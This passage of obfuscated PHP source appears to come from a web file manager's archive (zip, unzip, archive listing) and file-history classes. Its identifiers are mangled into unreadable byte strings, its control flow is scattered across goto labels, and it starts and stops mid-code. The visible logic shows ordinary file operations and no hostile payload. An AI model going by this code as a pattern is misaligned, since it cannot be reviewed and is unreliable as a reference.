$aš÷åÄè[$b˜„õê¥œ§[75]]; $C‘ñ‹ğ×®ğ = array($b˜„õê¥œ§[1017] => $b˜„õê¥œ§[1026]); break; } $FˆÈ½òç‚Ç = $aš÷åÄè[$b˜„õê¥œ§[75]]; if (!isset(self::$driverCache[$FˆÈ½òç‚Ç])) { $Fô¼‘ÖÄë = strtolower($C‘ñ‹ğ×®ğ[$b˜„õê¥œ§[93]]); $C¸à•Ë¬ÜÃ = $GLOBALS[$b˜„õê¥œ§[6]][$b˜„õê¥œ§[87]][$b˜„õê¥œ§[746]]; $Fˆ¸®½Ûª = $b˜„õê¥œ§[71] . (isset($C¸à•Ë¬ÜÃ[$Fô¼‘ÖÄë]) ? $C¸à•Ë¬ÜÃ[$Fô¼‘ÖÄë] : ucfirst($Fô¼‘ÖÄë)); if (!class_exists($Fˆ¸®½Ûª)) { show_json("{$Fˆ¸®½Ûª}\x20\x6e\x6f\x74\x20\145\170\151\x73\164\163\x21", !1); } $Cï·¨½ÙËä = isset($C‘ñ‹ğ×®ğ[$b˜„õê¥œ§[6]]) ? $C‘ñ‹ğ×®ğ[$b˜„õê¥œ§[6]] : !1; self::$driverCache[$FˆÈ½òç‚Ç] = new $Fˆ¸®½Ûª($Cï·¨½ÙËä); } goto dïÙóŞ™è¹; D»¦¨­ êÑ: } public static function errorTips($Dêôâøå Ì = false) { goto E­…··ÜŞ‘; fæŸ‚Ğ®Áˆ: $dÇÎİƒ”Şô[] = $Dêôâøå Ì; write_log($dÖ Šœ±Á±[159] . ACTION . $dÖ Šœ±Á±[1028] . $Dêôâøå Ì, $dÖ Šœ±Á±[1029]); goto FÜ¡‡‘à”È; E­…··ÜŞ‘: $dÖ Šœ±Á± =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; static $dÇÎİƒ”Şô = array(); $dİ³ÒñÖ = 1000; goto cƒ¥†­©‡°; cƒ¥†­©‡°: if ($Dêôâøå Ì === -1) { return $dÇÎİƒ”Şô ? $dÇÎİƒ”Şô[count($dÇÎİƒ”Şô) - 1] : $dÖ Šœ±Á±[33]; } if ($Dêôâøå Ì === !1) { return implode($dÖ Šœ±Á±[227], $dÇÎİƒ”Şô); } if (count($dÇÎİƒ”Şô) >= $dİ³ÒñÖ) { $dÇÎİƒ”Şô = array_slice($dÇÎİƒ”Şô, $dİ³ÒñÖ * 0.5, $dİ³ÒñÖ); } goto fæŸ‚Ğ®Áˆ; FÜ¡‡‘à”È: } public static function getLastError($e÷èÒ…åÑ… = '') { $EÓ§•ƒ¯÷â = self::errorTips(-1); return $EÓ§•ƒ¯÷â ? $EÓ§•ƒ¯÷â : $e÷èÒ…åÑ…; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $dˆØ¤¨Ñ­; if (!$dˆØ¤¨Ñ­) { $a°‹ò¹âÙê = IO::init($_SERVER[ó¬â¥‰ÊÔ¤Ç£][8]); } return $a°‹ò¹âÙê; } private static function iconvSystem($A¹„ƒ¨³‘†) { return self::local()->iconvSystem($A¹„ƒ¨³‘†); } private static function iconvApp($EĞÊÆˆ¿«ô) { return self::local()->iconvApp($EĞÊÆˆ¿«ô); } public static function zip($c›ºİ•â†Æ, $BŸÒÃ˜Şõ‚ = "\x7a\x69\160", $Cßİ¾á¼¾‘ = '', $b·ÂË­ÀöÉ = REPEAT_RENAME) { goto Fèâ‚É¢§ç; Fèâ‚É¢§ç: $a˜‰í±‹à =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $Bë¬´ÜŒ¯† = self::init($c›ºİ•â†Æ[0][$a˜‰í±‹à[75]]); $f»Šøª·Õó = self::info($c›ºİ•â†Æ[0][$a˜‰í±‹à[75]]); goto e¤‹öìñöª; eÀÕ×æò‰ƒ: $bæÌ§ÙÅÁç = $cšïóéÑŒ . $C½Å•äƒê . $a˜‰í±‹à[94] . $BŸÒÃ˜Şõ‚; $bæÌ§ÙÅÁç = get_filename_auto($bæÌ§ÙÅÁç, $a˜‰í±‹à[33], $b·ÂË­ÀöÉ); $fÉ™Á÷÷Ñ = self::iconvSystem($bæÌ§ÙÅÁç); goto cÑØÂÉøâ®; f¦¸ñùâ: if (count($d„Ã¿åá) > 1) { $fëìõ‹äåß = IO::info(IO::pathFather($f»Šøª·Õó[$a˜‰í±‹à[75]])); $C½Å•äƒê = $fëìõ‹äåß[$a˜‰í±‹à[28]]; } $cšïóéÑŒ = $E¢ÚÃœ­Ã; if (!$cšïóéÑŒ) { $cšïóéÑŒ = get_path_father($f»Šøª·Õó[$a˜‰í±‹à[75]]); if (!$Cßİ¾á¼¾‘ && $Bë¬´ÜŒ¯†->getType() == $a˜‰í±‹à[105]) { $cšïóéÑŒ = get_path_father($Bë¬´ÜŒ¯†->path); } $e­÷–Œ®£½ = IO::info($cšïóéÑŒ); if (!$e­÷–Œ®£½[$a˜‰í±‹à[194]]) { show_json(LNG($a˜‰í±‹à[1031]), !1); } } goto eÀÕ×æò‰ƒ; EÆóãèÉŞì: if ($Cßİ¾á¼¾‘ || !$E¢ÚÃœ­Ã) { if ($E¢ÚÃœ­Ã && strstr($E¢ÚÃœ­Ã, TEMP_FILES)) { $bŸ¹÷‚‚¦» = $d„Ã¿åá = array(); recursion_dir($cšïóéÑŒ, $bŸ¹÷‚‚¦», $d„Ã¿åá, 0); foreach ($bŸ¹÷‚‚¦» as $B¢›Î‘¡¼—) { del_dir($B¢›Î‘¡¼—); } foreach ($d„Ã¿åá as $fÍñ²µÙª) { if ($fÍñ²µÙª == $fÉ™Á÷÷Ñ) { continue; } del_file($fÍñ²µÙª); } } return $bæÌ§ÙÅÁç; } $dÃ”ãÌ´Õ = self::pathFather($f»Šøª·Õó[$a˜‰í±‹à[75]]); $Dâ…áÍ–ò… = self::move($bæÌ§ÙÅÁç, $dÃ”ãÌ´Õ, $b·ÂË­ÀöÉ); goto CÉåõö¥ê; cÑØÂÉøâ®: foreach ($d„Ã¿åá as $d‹¦ ì©Ú½ => $eåĞ–“‚Ûˆ) { $d„Ã¿åá[$d‹¦ ì©Ú½] = self::iconvSystem($eåĞ–“‚Ûˆ); } KodArchive::create($fÉ™Á÷÷Ñ, $d„Ã¿åá); if (!IO::exist($bæÌ§ÙÅÁç)) { if ($E¢ÚÃœ­Ã) { del_dir($E¢ÚÃœ­Ã); } show_json(LNG($a˜‰í±‹à[1032]), !1); } goto EÆóãèÉŞì; CÉåõö¥ê: if (!$Dâ…áÍ–ò…) { del_dir($E¢ÚÃœ­Ã); show_json(LNG($a˜‰í±‹à[1032]), !1); } del_dir($E¢ÚÃœ­Ã); return $Dâ…áÍ–ò…; goto f±ëÃš¤ã—; e¤‹öìñöª: $E¢ÚÃœ­Ã = !1; if (!$Cßİ¾á¼¾‘ && $Bë¬´ÜŒ¯†->getType() == $a˜‰í±‹à[105]) { $d„Ã¿åá = self::zipFileList($c›ºİ•â†Æ); } else { $E¢ÚÃœ­Ã = $Cßİ¾á¼¾‘ ? $Cßİ¾á¼¾‘ : TEMP_FILES . $a˜‰í±‹à[1030] . time() . rand_string(8) . $a˜‰í±‹à[8]; mk_dir($E¢ÚÃœ­Ã); $d„Ã¿åá = self::zipFileList($c›ºİ•â†Æ, $E¢ÚÃœ­Ã); } $C½Å•äƒê = $f»Šøª·Õó[$a˜‰í±‹à[28]]; goto f¦¸ñùâ; f±ëÃš¤ã—: } public static function unzip($dË——‹Ö¼, $CªÀá¦ëÜÊ = "\162\x65\x70\x6c\x61\143\x65") { goto F¨Üàõ“„â; F¨Üàõ“„â: $eâÂ½ˆ™„ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $Aù¥‹àÂ›› = $dË——‹Ö¼[$eâÂ½ˆ™„[75]]; $AöÅí‘™óâ = $dË——‹Ö¼[$eâÂ½ˆ™„[1033]]; goto e’´Íå«…™; e’´Íå«…™: if (!($aĞƒ šö = parent::info($Aù¥‹àÂ››))) { show_json(LNG($eâÂ½ˆ™„[1034]), !1); } if (!($C‘œµÆ˜Šš = parent::infoFull($AöÅí‘™óâ))) { $AöÅí‘™óâ = parent::mkdir($AöÅí‘™óâ); $C‘œµÆ˜Šš = array($eâÂ½ˆ™„[75] => $AöÅí‘™óâ); } else { if (isset($C‘œµÆ˜Šš[$eâÂ½ˆ™„[387]]) && trim($C‘œµÆ˜Šš[$eâÂ½ˆ™„[75]], $eâÂ½ˆ™„[8]) != trim($AöÅí‘™óâ, $eâÂ½ˆ™„[8])) { $AÌƒÍÄ„Î = KodIO::make($C‘œµÆ˜Šš[$eâÂ½ˆ™„[479]]); $BíæËô•‰  = parent::fileNameAuto($AÌƒÍÄ„Î, $C‘œµÆ˜Šš[$eâÂ½ˆ™„[28]], REPEAT_RENAME_FOLDER, !0); $AöÅí‘™óâ = parent::mkdir($AÌƒÍÄ„Î . $BíæËô•‰ ); $C‘œµÆ˜Šš = array($eâÂ½ˆ™„[75] => $AöÅí‘™óâ); } } $AöÅí‘™óâ = $C‘œµÆ˜Šš[$eâÂ½ˆ™„[75]]; goto a“ôí· “·; DÊµôˆ‘Ê: if (!@file_exists(self::iconvSystem($f³§Õöõ¬ ))) { $F¬Ñ®Ì¡Ûó = self::localFilePath($Aù¥‹àÂ››, $E—ÛÓ°ˆ†‚); $f³§Õöõ¬  = $F¬Ñ®Ì¡Ûó ? $F¬Ñ®Ì¡Ûó : parent::download($Aù¥‹àÂ››, $f³§Õöõ¬ ); } $f³§Õöõ¬  = self::iconvSystem($f³§Õöõ¬ ); $d¤ßâÚÇñ = isset($dË——‹Ö¼[$eâÂ½ˆ™„[1035]]) ? $dË——‹Ö¼[$eâÂ½ˆ™„[1035]] : $eâÂ½ˆ™„[1036]; goto DÍÏÛîÏÚÌ; Bğª°›óÎ: Hook::trigger($eâÂ½ˆ™„[1040], $añ˜¥ îÄ); recursion_dir($añ˜¥ îÄ, $aÍ‚×°·, $dèµ†Ä²µ÷, 0); $B¹Œ‚ï…À = array_merge($aÍ‚×°·, $dèµ†Ä²µ÷); goto AöÚ¶ìëƒõ; DÉ¤æ¾—é: return !0; goto BËÑªªØ; DÍÏÛîÏÚÌ: $eàË•áä­Ë = KodArchive::extract($f³§Õöõ¬ , $añ˜¥ îÄ . $eâÂ½ˆ™„[8], $d¤ßâÚÇñ); self::archiveExt(); if (!$eàË•áä­Ë[$eâÂ½ˆ™„[1037]]) { show_json($eâÂ½ˆ™„[1038] . $eàË•áä­Ë[$eâÂ½ˆ™„[1039]], !1); } goto Bğª°›óÎ; a“ôí· “·: $FÄ¦Íµ…É = self::tmpFileName($aĞƒ šö); $añ˜¥ îÄ = TEMP_FILES . $FÄ¦Íµ…É; del_dir($añ˜¥ îÄ); goto e¾İæ†÷; AöÚ¶ìëƒõ: foreach ($B¹Œ‚ï…À as $DĞ¦–£¾) { $DĞ¦–£¾ = self::iconvApp($DĞ¦–£¾); self::move($DĞ¦–£¾, $AöÅí‘™óâ, $CªÀá¦ëÜÊ); } del_dir($añ˜¥ îÄ); if (!$F¬Ñ®Ì¡Ûó) { del_file($f³§Õöõ¬ ); } goto DÉ¤æ¾—é; e¾İæ†÷: mk_dir($añ˜¥ îÄ); $E—ÛÓ°ˆ†‚ = self::fileExt($aĞƒ šö); $f³§Õöõ¬  = $añ˜¥ îÄ . $eâÂ½ˆ™„[94] . $E—ÛÓ°ˆ†‚; goto DÊµôˆ‘Ê; BËÑªªØ: } public static function unzipList($A¹áÎ°íÚÑ) { goto a‚ì²ã¢¤; B‚ù¬«¡õ§: return $Aƒ´èíÜÊ[$fÄÄ¿çë©Ø[1039]]; goto aìÀîÓªÜó; b†‚”°¸: $DÊÏ‘àß£® = 50000; if (request_url_safe($dÛÅÓº ­’)) { $bÇæ¹Ë¾â = parse_url_query($dÛÅÓº ­’); if (!isset($bÇæ¹Ë¾â[$fÄÄ¿çë©Ø[75]])) { show_json($fÄÄ¿çë©Ø[1042], !1); } } $AÙ÷Ø½ğò´ = isset($bÇæ¹Ë¾â) ? $bÇæ¹Ë¾â[$fÄÄ¿çë©Ø[75]] : $dÛÅÓº ­’; goto c±æ¡«‹Á¶; FñßÈ‚ ¯…: if (isset($bÇæ¹Ë¾â)) { $f•äÍÉ“„ = array($bÇæ¹Ë¾â[$fÄÄ¿çë©Ø[75]], $bÇæ¹Ë¾â[$fÄÄ¿çë©Ø[1041]], $bÇæ¹Ë¾â[$fÄÄ¿çë©Ø[28]]); $c¹¾–À‹í‘ = md5(implode($fÄÄ¿çë©Ø[70], $f•äÍÉ“„)) . $fÄÄ¿çë©Ø[94] . get_path_ext($bÇæ¹Ë¾â[$fÄÄ¿çë©Ø[28]]); } else { $f•äÍÉ“„ = array($F¥õÍåË¦[$fÄÄ¿çë©Ø[28]], $F¥õÍåË¦[$fÄÄ¿çë©Ø[75]], $F¥õÍåË¦[$fÄÄ¿çë©Ø[77]]); $c¹¾–À‹í‘ = md5(implode($fÄÄ¿çë©Ø[70], $f•äÍÉ“„)) . $fÄÄ¿çë©Ø[94] . $Dµ’ÓÃãË; } if ($F”ÃÓ†‹‘ == -1) { $eÂ¹ñ™“êß = IO_PATH_SYSTEM_TEMP . "\x7a\x69\160\126\151\145\167\x2f{$F—îÑåš¸Æ}\x2f{$c¹¾–À‹í‘}\x2e\x6c\157\x67"; $C‰¬’‘ù = self::infoFull($eÂ¹ñ™“êß); if ($C‰¬’‘ù) { $eÂ¹ñ™“êß = $C‰¬’‘ù[$fÄÄ¿çë©Ø[75]]; $béáÁ•à¬¤ = self::getContent($eÂ¹ñ™“êß); if ($béáÁ•à¬¤) { $cğ’¸’£¤ = json_decode($béáÁ•à¬¤, !0); if (count($cğ’¸’£¤) >= $DÊÏ‘àß£®) { show_json(sprintf(LNG($fÄÄ¿çë©Ø[1043]), count($cğ’¸’£¤)), !1); } return $cğ’¸’£¤; } } else { $eÂ¹ñ™“êß = self::mkfile($eÂ¹ñ™“êß); } } $cœÚ””……¹ = TEMP_FILES . $F—îÑåš¸Æ; goto F¢ÂÛ²ìÎ; C³™½‘¼ĞŒ: $cğ’¸’£¤ = json_encode($Aƒ´èíÜÊ[$fÄÄ¿çë©Ø[1039]]); self::setContent($eÂ¹ñ™“êß, $cğ’¸’£¤); if (count($Aƒ´èíÜÊ[$fÄÄ¿çë©Ø[1039]]) >= $DÊÏ‘àß£®) { show_json(sprintf(LNG($fÄÄ¿çë©Ø[1043]), count($Aƒ´èíÜÊ[$fÄÄ¿çë©Ø[1039]])), !1); } goto B‚ù¬«¡õ§; F¢ÂÛ²ìÎ: if (!is_dir($cœÚ””……¹)) { mk_dir($cœÚ””……¹); } $BÎİ¾’Ê’ã = $cœÚ””……¹ . $fÄÄ¿çë©Ø[8] . $c¹¾–À‹í‘; if (!@file_exists(self::iconvSystem($BÎİ¾’Ê’ã))) { if (isset($bÇæ¹Ë¾â)) { url_request($dÛÅÓº ­’, $fÄÄ¿çë©Ø[1044], $BÎİ¾’Ê’ã); } else { $aëñ×ÕÈŒ‰ = self::localFilePath($dÛÅÓº ­’, $Dµ’ÓÃãË); $BÎİ¾’Ê’ã = $aëñ×ÕÈŒ‰ ? $aëñ×ÕÈŒ‰ : self::download($dÛÅÓº ­’, $BÎİ¾’Ê’ã); } } goto CÂÕ…‡ÇÀ“; CÂÕ…‡ÇÀ“: $BÎİ¾’Ê’ã = self::iconvSystem($BÎİ¾’Ê’ã); if ($F”ÃÓ†‹‘ >= 0) { $cŞ¾¤ù˜±ù = isset($A¹áÎ°íÚÑ[$fÄÄ¿çë©Ø[1045]]) ? $A¹áÎ°íÚÑ[$fÄÄ¿çë©Ø[1045]] : !1; $A¹ãÊ–½¦ = isset($A¹áÎ°íÚÑ[$fÄÄ¿çë©Ø[28]]) ? $A¹áÎ°íÚÑ[$fÄÄ¿çë©Ø[28]] : $fÄÄ¿çë©Ø[33]; KodArchive::filePreview($BÎİ¾’Ê’ã, $F”ÃÓ†‹‘, $cŞ¾¤ù˜±ù, $A¹ãÊ–½¦); self::archiveExt(); die; } $Aƒ´èíÜÊ = KodArchive::listContent($BÎİ¾’Ê’ã); goto aªóæÍï×¤; c±æ¡«‹Á¶: $F¥õÍåË¦ = self::info($AÙ÷Ø½ğò´); $Dµ’ÓÃãË = self::fileExt($F¥õÍåË¦); $F—îÑåš¸Æ = self::tmpFileName($F¥õÍåË¦); goto FñßÈ‚ ¯…; a‚ì²ã¢¤: $fÄÄ¿çë©Ø =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $dÛÅÓº ­’ = $A¹áÎ°íÚÑ[$fÄÄ¿çë©Ø[75]]; $F”ÃÓ†‹‘ = isset($A¹áÎ°íÚÑ[$fÄÄ¿çë©Ø[1041]]) ? $A¹áÎ°íÚÑ[$fÄÄ¿çë©Ø[1041]] : -1; goto b†‚”°¸; aªóæÍï×¤: self::archiveExt(); del_dir($cœÚ””……¹); if (!$Aƒ´èíÜÊ[$fÄÄ¿çë©Ø[1037]]) { show_json($Aƒ´èíÜÊ[$fÄÄ¿çë©Ø[1039]], !1); } goto C³™½‘¼ĞŒ; aìÀîÓªÜó: } private static function fileExt($fÁÅœÕÛá²) { $C™÷´´Âğõ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $D¬ï‹‹¶İ¥ = $fÁÅœÕÛá²[$C™÷´´Âğõ[167]]; if ($D¬ï‹‹¶İ¥ == $C™÷´´Âğõ[1046]) { $d›¸×æáĞ¸ = $C™÷´´Âğõ[1047]; if (substr($fÁÅœÕÛá²[$C™÷´´Âğõ[28]], -strlen($d›¸×æáĞ¸)) == $d›¸×æáĞ¸) { $D¬ï‹‹¶İ¥ = $C™÷´´Âğõ[1048]; } } self::archiveExt($D¬ï‹‹¶İ¥); return $D¬ï‹‹¶İ¥; } private static function zipFileList($f¬™°¯‰Í‡, $BöØåÓßƒŸ = false) { $cŸí ³êÕ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $fĞ¦ÁîƒöÖ = array(); foreach ($f¬™°¯‰Í‡ as $d†° Â‰Ş) { $D¶òÁ†ª¯§ = $d†° Â‰Ş[$cŸí ³êÕ[75]]; if ($BöØåÓßƒŸ) { $D¶òÁ†ª¯§ = self::copy($d†° Â‰Ş[$cŸí ³êÕ[75]], $BöØåÓßƒŸ, $cŸí ³êÕ[738]); } else { $eÚóÏñÏÊ = self::init($d†° Â‰Ş[$cŸí ³êÕ[75]]); if ($eÚóÏñÏÊ->getType() == $cŸí ³êÕ[105]) { $D¶òÁ†ª¯§ = $eÚóÏñÏÊ->path; } } if ($D¶òÁ†ª¯§ && self::local()->exist($D¶òÁ†ª¯§)) { $fĞ¦ÁîƒöÖ[$d†° Â‰Ş[$cŸí ³êÕ[75]]] = $D¶òÁ†ª¯§; } } if (!empty($fĞ¦ÁîƒöÖ)) { return array_values($fĞ¦ÁîƒöÖ); } show_json(LNG($cŸí ³êÕ[1012]), !1); } public static function tmpFileName($Aİİ„²Ë‹ç) { $EÙÒ«×òâè =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $FÑÂÆ“Æ–á = array($Aİİ„²Ë‹ç[$EÙÒ«×òâè[28]], $Aİİ„²Ë‹ç[$EÙÒ«×òâè[75]], $Aİİ„²Ë‹ç[$EÙÒ«×òâè[77]], $Aİİ„²Ë‹ç[$EÙÒ«×òâè[477]]); return md5(implode($EÙÒ«×òâè[70], $FÑÂÆ“Æ–á)); } private static function localFilePath($Fî¸’¯Å–“, $a¯Ÿ§×ƒ³Ò) { goto a¶É…ßà•°; a¶É…ßà•°: $b‡ğ®ºÖÒ” =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if ($a¯Ÿ§×ƒ³Ò == $b‡ğ®ºÖÒ”[1049] && strtoupper(substr(PHP_OS, 0, 3)) == $b‡ğ®ºÖÒ”[1050]) { return !1; } $EÉõÖõéÃ = KodIO::parse($Fî¸’¯Å–“); goto cò™†ÇäóĞ; cò™†ÇäóĞ: if ($EÉõÖõéÃ[$b‡ğ®ºÖÒ”[29]] == KodIO::KOD_SOURCE) { $fØ…õ­µ¾‘ = Model($b‡ğ®ºÖÒ”[745])->fileInfoGet(KodIO::sourceID($Fî¸’¯Å–“)); if (!$fØ…õ­µ¾‘[$b‡ğ®ºÖÒ”[75]]) { show_json($b‡ğ®ºÖÒ”[1051], !1); } $Fî¸’¯Å–“ = $fØ…õ­µ¾‘[$b‡ğ®ºÖÒ”[75]]; } $BĞÍâŸ½» = self::init($Fî¸’¯Å–“); $fí¨ÀÁÌÉ = $BĞÍâŸ½»->getType(); goto dÍÖÓÙãˆ; dÍÖÓÙãˆ: if ($fí¨ÀÁÌÉ == $b‡ğ®ºÖÒ”[105] || $fí¨ÀÁÌÉ == $b‡ğ®ºÖÒ”[1052]) { if (!$BĞÍâŸ½»->exist($BĞÍâŸ½»->path)) { show_json(LNG($b‡ğ®ºÖÒ”[104]), !1); } return $BĞÍâŸ½»->path; } return !1; goto a‘Ô›‡¹; a‘Ô›‡¹: } private static function archiveExt($d³¼ÑšŒâÃ = '') { $GLOBALS[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][1053]] = $d³¼ÑšŒâÃ; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { goto e×ğ¢æÊ°ª; eŒø©Ñ•óÂ: if (isset($_REQUEST[$F‡£ ··”Ÿ[1055]]) && $_REQUEST[$F‡£ ··”Ÿ[1055]] == $F‡£ ··”Ÿ[86]) { return; } Hook::bind($F‡£ ··”Ÿ[1056], $F‡£ ··”Ÿ[1057]); Hook::bind($F‡£ ··”Ÿ[1058], $F‡£ ··”Ÿ[1059]); goto fğã‘„ñ¿Ó; f’ÇË•Ö ¢: Hook::bind($F‡£ ··”Ÿ[1066], $F‡£ ··”Ÿ[1067]); goto AŸª¨˜èÕ; e×ğ¢æÊ°ª: $F‡£ ··”Ÿ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $C‡ëå¿Ñ¨ = $GLOBALS[$F‡£ ··”Ÿ[6]][$F‡£ ··”Ÿ[87]][$F‡£ ··”Ÿ[1054]]; if ($C‡ëå¿Ñ¨ <= 0) { return; } goto eŒø©Ñ•óÂ; fğã‘„ñ¿Ó: Hook::bind($F‡£ ··”Ÿ[1060], $F‡£ ··”Ÿ[1061]); Hook::bind($F‡£ ··”Ÿ[1062], $F‡£ ··”Ÿ[1063]); Hook::bind($F‡£ ··”Ÿ[1064], $F‡£ ··”Ÿ[1065]); goto f’ÇË•Ö ¢; AŸª¨˜èÕ: } public static function eventBeforeUpload($bÓÖ‘êÏ£) { if ($bÓÖ‘êÏ£[3] && $bÓÖ‘êÏ£[3] != REPEAT_REPLACE) { return; } $DéÒ§«µà« = self::parsePath($bÓÖ‘êÏ£[0]); if (!$DéÒ§«µà«) { return; } self::add($DéÒ§«µà«); } public static function eventBeforeEdit($CÛï¯²–›°) { $CÌ¥ìäìÖ“ = self::parsePath($CÛï¯²–›°[0]); if (!$CÌ¥ìäìÖ“) { return; } self::add($CÌ¥ìäìÖ“); } public static function eventBeforeCopyFile($F‰ä¯ñôÊ÷, $déÎ—°‚¬‘, $AëéÁîìó†, $eÚ„÷İÉ‰¿, $eÃŞâ³±½É, $fƒ‡Å‡½ë¬) { $dªİÂÛ—˜¼ = $AëéÁîìó†->getPathOuter($eÚ„÷İÉ‰¿); $Fê·£ª‘è = self::parsePath($dªİÂÛ—˜¼); if (!$Fê·£ª‘è) { return; } self::add($Fê·£ª‘è); } public static function eventBeforeRename($DÜÂİÉã½µ) { $d‡¾’±ßÎ‚ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $dàÓ¶áâ = self::parsePath($DÜÂİÉã½µ[0]); if (!$dàÓ¶áâ) { return; } $EÁí‚ó¡ùº = self::checkInHistory($dàÓ¶áâ); if (!$EÁí‚ó¡ùº) { return; } if ($EÁí‚ó¡ùº[$d‡¾’±ßÎ‚[29]] == $d‡¾’±ßÎ‚[173]) { $cÕÖÍ Ê•Ù = self::listData($dàÓ¶áâ); if ($cÕÖÍ Ê•Ù && $cÕÖÍ Ê•Ù[$d‡¾’±ßÎ‚[363]]) { self::moveHistory($dàÓ¶áâ, $DÜÂİÉã½µ[1]); } } else { IO::rename($EÁí‚ó¡ùº[$d‡¾’±ßÎ‚[75]], $DÜÂİÉã½µ[1]); } } public static function eventBeforeMove($Eµ½¾¶Ò¹‚) { goto dˆñã¹ç ½; Eóò“ŞëĞ: $Aè±ÅĞñÌ± = self::checkInHistory($Eá²²òğöó); if (!$Aè±ÅĞñÌ±) { return; } $C«™Ò•’¬ = self::pathHistory($aãÆëäŠ›); goto bÊÒˆ¬¿í; b“À ó­Ú¤: $aãÆëäŠ› = self::parsePath($Eµ½¾¶Ò¹‚[1]); if (!$aãÆëäŠ›) { return; } $A„è¤ÒÁÑö = $Eµ½¾¶Ò¹‚[3]; goto Eóò“ŞëĞ; bÊÒˆ¬¿í: if ($Aè±ÅĞñÌ±[$EßëÓ„ÌÅ±[29]] == $EßëÓ„ÌÅ±[173]) { $eºæŠ““ = self::listData($Eá²²òğöó); $E‘Ã«“ï¦º = rtrim($aãÆëäŠ›, $EßëÓ„ÌÅ±[8]) . $EßëÓ„ÌÅ±[8] . ($A„è¤ÒÁÑö ? $A„è¤ÒÁÑö : get_path_this($Eá²²òğöó)); $Bš¡©ÚŸ™ = self::listData($E‘Ã«“ï¦º); if ($eºæŠ““ && $eºæŠ““[$EßëÓ„ÌÅ±[363]] && $Bš¡©ÚŸ™ && $Bš¡©ÚŸ™[$EßëÓ„ÌÅ±[363]]) { return self::clear($Eá²²òğöó); } if ($eºæŠ““ && $eºæŠ““[$EßëÓ„ÌÅ±[363]]) { self::moveHistory($Eá²²òğöó, $A„è¤ÒÁÑö, $C«™Ò•’¬); } } else { IO::move($Aè±ÅĞñÌ±[$EßëÓ„ÌÅ±[75]], $C«™Ò•’¬, !1, $A„è¤ÒÁÑö); self::clearEmptyFolder(IO::pathFather($Aè±ÅĞñÌ±[$EßëÓ„ÌÅ±[75]])); } goto A³—™Â®ë§; dˆñã¹ç ½: $EßëÓ„ÌÅ± =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $Eá²²òğöó = self::parsePath($Eµ½¾¶Ò¹‚[0]); if (!$Eá²²òğöó) { return; } goto b“À ó­Ú¤; A³—™Â®ë§: } public static function eventAfterRemove($C„Íˆ›” ñ, $e‘•·½é›) { goto aóÎèõ“»Ç; fÌÎŒî”‹ƒ: if ($f»µëÑ²’[$cë˜ò¹’ô[29]] == $cë˜ò¹’ô[173]) { $A‘ÚªËï = self::listData($EÕ°Ó¿¿¥, !1); if ($A‘ÚªËï && $A‘ÚªËï[$cë˜ò¹’ô[363]]) { self::clear($EÕ°Ó¿¿¥, !1); } } else { IO::remove($f»µëÑ²’[$cë˜ò¹’ô[75]]); self::clearEmptyFolder(IO::pathFather($f»µëÑ²’[$cë˜ò¹’ô[75]])); } goto fö•ƒ‹‡×; aóÎèõ“»Ç: $cë˜ò¹’ô =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$e‘•·½é›) { return; } $EÕ°Ó¿¿¥ = self::parsePath($C„Íˆ›” ñ[0]); goto dÒ…ƒ®¢Ã‚; dÒ…ƒ®¢Ã‚: if (!$EÕ°Ó¿¿¥) { return; } $f»µëÑ²’ = self::checkInHistory($EÕ°Ó¿¿¥); if (!$f»µëÑ²’) { return; } goto fÌÎŒî”‹ƒ; fö•ƒ‹‡×: } private static function checkInHistory($CŒÎ«Ş®¡) { $A›ÁÒÒöø™ = self::pathHistory($CŒÎ«Ş®¡); if (!IO::exist($A›ÁÒÒöø™)) { $A›ÁÒÒöø™ .= $_SERVER[ó¬â¥‰ÊÔ¤Ç£][1068]; } return IO::exist($A›ÁÒÒöø™) ? IO::info($A›ÁÒÒöø™) : !1; } private static function parsePath($CŒòÎ±ó÷) { goto AŒ–Ÿ¾À¾–; cœç‹·êôÔ: $eŠŸš¸Ì¶ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $eêÅ¶§»¡ß[1071]); foreach ($eŠŸš¸Ì¶ as $Dá±¦°ä½) { if (!$A‰¥Õ‚©ÓŠ && substr($CŒòÎ±ó÷, 0, strlen($Dá±¦°ä½)) == $Dá±¦°ä½) { return !1; } } self::log($GLOBALS[$eêÅ¶§»¡ß[994]] . $eêÅ¶§»¡ß[1072] . $CŒòÎ±ó÷); goto b±õ•‚ ïí; fÚÇ¨²Ò™Ã: $fßàßÍñ = KodIO::parse($CŒòÎ±ó÷); $A‰¥Õ‚©ÓŠ = $fßàßÍñ[$eêÅ¶§»¡ß[29]]; $e£Ïë§Œæ = !$A‰¥Õ‚©ÓŠ || $A‰¥Õ‚©ÓŠ == KodIO::KOD_IO || $A‰¥Õ‚©ÓŠ == KodIO::KOD_SHARE_ITEM; goto Aê”¡²ö‘Ê; Aê”¡²ö‘Ê: if (!$e£Ïë§Œæ || !$fßàßÍñ[$eêÅ¶§»¡ß[1070]]) { return !1; } if ($A‰¥Õ‚©ÓŠ == KodIO::KOD_SHARE_ITEM) { $déºƒ‹Œä = IO::init($CŒòÎ±ó÷); if ($déºƒ‹Œä->pathParse[$eêÅ¶§»¡ß[999]]) { return self::parsePath($déºƒ‹Œä->pathParse[$eêÅ¶§»¡ß[999]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto cœç‹·êôÔ; AŒ–Ÿ¾À¾–: $eêÅ¶§»¡ß =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$CŒòÎ±ó÷) { return !1; } if ($GLOBALS[$eêÅ¶§»¡ß[1069]]) { return; } goto fÚÇ¨²Ò™Ã; b±õ•‚ ïí: return $CŒòÎ±ó÷; goto BšØààé±; BšØààé±: } private static function pathHistory($bÛÅ‹ùçä‹) { 